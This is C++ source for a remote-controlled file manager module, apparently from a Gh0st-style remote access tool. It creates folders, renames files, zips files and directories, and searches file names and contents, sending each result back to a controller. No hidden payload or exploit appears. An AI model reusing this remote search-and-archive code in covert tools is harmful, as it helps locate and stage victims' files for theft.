void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

//压缩解或压缩文件
void CFileManager::ExeCompress(BYTE *lpBuffer)  
{  
    char* pszFilePath = (char*)lpBuffer;  
    CString strInputPath = pszFilePath;  
    CString strOutputPath = strInputPath + ".zip";  
      
    if (CreateZipArchive(strInputPath, strOutputPath))  
    {  
        SendToken(TOKEN_COMPRESS_FINISH);  
    }  
    else  
    {  
        SendToken(TOKEN_COMPRESS_ERROR);  
    }  
}  
  
bool CFileManager::CreateZipArchive(const CString& inputPath, const CString& outputPath)  
{  
    FILE* zipFile = fopen(outputPath, "wb");  
    if (!zipFile) return false;  
      
    std::vector<ZipCentralDirEntry> centralDir;  
    std::vector<CString> filenames;  
    DWORD centralDirOffset = 0;  
      
    // 检查是文件还是目录  
    DWORD attrs = GetFileAttributes(inputPath);  
    if (attrs == INVALID_FILE_ATTRIBUTES) {  
        fclose(zipFile);  
        return false;  
    }  
      
    bool success = false;  
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {  
        // 压缩目录  
        success = CompressDirectory(zipFile, inputPath, "", centralDir, filenames, centralDirOffset);  
    } else {  
        // 压缩单个文件  
        CString fileName = inputPath;  
        int pos = fileName.ReverseFind('\\');  
        if (pos != -1) fileName = fileName.Mid(pos + 1);  
        success = CompressFile(zipFile, inputPath, fileName, centralDir, filenames, centralDirOffset);  
    }  
      
    if (success) {  
        WriteCentralDirectory(zipFile, centralDir, filenames, centralDirOffset);  
    }  
      
    fclose(zipFile);  
    return success;  
}  
  
bool CFileManager::CompressFile(FILE* zipFile, const CString& filePath, const CString& relativePath,   
                               std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset)  
{  
    FILE* inputFile = fopen(filePath, "rb");  
    if (!inputFile) return false;  
      
    // 获取文件大小  
    fseek(inputFile, 0, SEEK_END);  
    DWORD fileSize = ftell(inputFile);  
    fseek(inputFile, 0, SEEK_SET);  
      
    // 读取文件数据  
    BYTE* fileData = new BYTE[fileSize];  
    fread(fileData, 1, fileSize, inputFile);  
    fclose(inputFile);  
      
    // 计算CRC32  
    DWORD crc = crc32(0L, Z_NULL, 0);  
    crc = crc32(crc, fileData, fileSize);  
      
    // 使用deflateInit2进行压缩  
    z_stream strm;  
    strm.zalloc = Z_NULL;  
    strm.zfree = Z_NULL;  
    strm.opaque = Z_NULL;  
      
    // 关键：使用-15的windowBits生成raw deflate数据  
    int ret = deflateInit2(&strm, Z_DEFAULT_COMPRESSION, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY);  
    if (ret != Z_OK) {  
        delete[] fileData;  
        return false;  
    }  
      
    // 压缩数据  
    DWORD compressedSize = deflateBound(&strm, fileSize);  
    BYTE* compressedData = new BYTE[compressedSize];  
      
    strm.next_in = fileData;  
    strm.avail_in = fileSize;  
    strm.next_out = compressedData;  
    strm.avail_out = compressedSize;  
      
    ret = deflate(&strm, Z_FINISH);  
    if (ret != Z_STREAM_END) {  
        deflateEnd(&strm);  
        delete[] fileData;  
        delete[] compressedData;  
        return false;  
    }  
      
    compressedSize = strm.total_out;  
    deflateEnd(&strm);  
      
    // 写入ZIP本地文件头  
    ZipLocalFileHeader header = {0};  
    header.signature = 0x04034b50;  
    header.version = 20;  
    header.compression = 8; // deflate  
    header.crc32 = crc;  
    header.compressedSize = compressedSize;  
    header.uncompressedSize = fileSize;  
    header.filenameLength = relativePath.GetLength();  
      
    DWORD headerOffset = ftell(zipFile);  
    fwrite(&header, sizeof(header), 1, zipFile);  
	fwrite((LPCTSTR)relativePath, relativePath.GetLength(), 1, zipFile);

    fwrite(compressedData, compressedSize, 1, zipFile);  
      
    // 添加到中央目录  
    ZipCentralDirEntry dirEntry = {0};  
    dirEntry.signature = 0x02014b50;  
    dirEntry.versionMade = 20;  
    dirEntry.versionNeeded = 20;  
    dirEntry.compression = 8;  
    dirEntry.crc32 = crc;  
    dirEntry.compressedSize = compressedSize;  
    dirEntry.uncompressedSize = fileSize;  
    dirEntry.filenameLength = relativePath.GetLength();  
    dirEntry.localHeaderOffset = headerOffset;  
      
    centralDir.push_back(dirEntry);  
    filenames.push_back(relativePath);  
      
    offset = ftell(zipFile);  
      
    delete[] fileData;  
    delete[] compressedData;  
    return true;  
}  
  
bool CFileManager::CompressDirectory(FILE* zipFile, const CString& dirPath, const CString& relativePath,  
                                   std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset)  
{  
    WIN32_FIND_DATA findData;  
    CString searchPath = dirPath + "\\*";  
    HANDLE hFind = FindFirstFile(searchPath, &findData);  
      
    if (hFind == INVALID_HANDLE_VALUE) return false;  
      
    do {  
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)  
            continue;  
              
        CString fullPath = dirPath + "\\" + findData.cFileName;  
        CString newRelativePath = relativePath.IsEmpty() ? findData.cFileName : relativePath + "/" + findData.cFileName;  
          
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {  
            // 递归压缩子目录  
            if (!CompressDirectory(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                FindClose(hFind);  
                return false;  
            }  
        } else {  
            // 压缩文件  
            if (!CompressFile(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                FindClose(hFind);  
                return false;  
            }  
        }  
    } while (FindNextFile(hFind, &findData));  
      
    FindClose(hFind);  
    return true;  
}  
  
void CFileManager::WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCentralDirEntry>& centralDir,   
                                        const std::vector<CString>& filenames, DWORD offset)  
{  
    DWORD centralDirStart = ftell(zipFile);  
      
    // 写入中央目录条目  
    for (size_t i = 0; i < centralDir.size(); i++) {  
        fwrite(&centralDir[i], sizeof(ZipCentralDirEntry), 1, zipFile);  
		fwrite((LPCTSTR)filenames[i], filenames[i].GetLength(), 1, zipFile);

    }  
      
    DWORD centralDirSize = ftell(zipFile) - centralDirStart;  
      
    // 写入中央目录结束记录  
    ZipEndOfCentralDir endRecord = {0};  
    endRecord.signature = 0x06054b50;  
    endRecord.entriesOnDisk = centralDir.size();  
    endRecord.totalEntries = centralDir.size();  
    endRecord.centralDirSize = centralDirSize;  
    endRecord.centralDirOffset = centralDirStart;  
      
    fwrite(&endRecord, sizeof(endRecord), 1, zipFile);  
}

void CFileManager::SearchFile(LPBYTE lpBuffer)// 查找文件
{
	FileSearchPacket mFileSearchPacket;
	memcpy( &mFileSearchPacket , lpBuffer , sizeof(FileSearchPacket) );
	
	CFileFinder _finder;
	CFileFinder::CFindOpts	opts;
	_finder.SetCallback(FileFinderProc,this);
	
	// 设置 CFindOpts对象
	opts.sBaseFolder = mFileSearchPacket.szDir;
	opts.sFileMask.Format("*%s*",mFileSearchPacket.szWord);
	opts.bSubfolders = mFileSearchPacket.bSubfordle;
	opts.FindNormalFiles();
	if (mFileSearchPacket.bSearchInFile)
	{
		opts.FindText(mFileSearchPacket.szWord);
	}
	
	_finder.RemoveAll();
	_finder.Find(opts);
	
	BYTE EndSearch[1];
	EndSearch[0] = TOKEN_SEARCH_END;
	Send(EndSearch,1);	
}
void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam)// 文件查找类回调函数
{
	CString			sText, sNewFile;
	MSG				msg;
	int				nListIndex;
	CFileManager	*pDlg = (CFileManager *)pCustomParam;
	
	switch (dwCode)
	{
	case FF_FOUND:
		// 构造数据包
		SearchResultPacket mSearchResult;
		sNewFile = pFinder->GetFilePath(pFinder->GetFileCount() - 1);
		lstrcpy(mSearchResult.szFullPath,sNewFile);
		
		// 获取文件大小
		HANDLE handle = CreateFile(sNewFile, FILE_READ_EA, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
		if (handle != INVALID_HANDLE_VALUE)
		{
			mSearchResult.nFileSize = GetFileSize(handle, NULL);
			CloseHandle(handle);
		}
		
		// 获取文件名称
		lstrcpy(mSearchResult.szFileName,PathFindFileName(sNewFile));
		
		// 获取时间
		SYSTEMTIME time;
        WIN32_FILE_ATTRIBUTE_DATA lpinf;
		GetFileAttributesEx(sNewFile,GetFileExInfoStandard,&lpinf);//获取文件信息，path为文件路径
		FileTimeToSystemTime(&lpinf.ftLastWriteTime,&time);//转换时间格式：FILETIME到SYSTEMTIME
		wsprintf(mSearchResult.szDate,"%d-%d-%d",time.wYear,time.wMonth,time.wDay);
		
		int nPacketLength = sizeof(SearchResultPacket) + 2;
		LPBYTE lpBuffer = new BYTE[nPacketLength];
		lpBuffer[0] = TOKEN_SEARCH_ADD;
		memcpy(lpBuffer+1,&mSearchResult,sizeof(SearchResultPacket));
		pDlg->Send(lpBuffer,nPacketLength);
		// 		CString text;
		// 		text.Format("内容： %s",lpBuffer);
		// 		MessageBox(NULL,text,"提示",MB_OK);
		Sleep(10);
		break;
	}
}
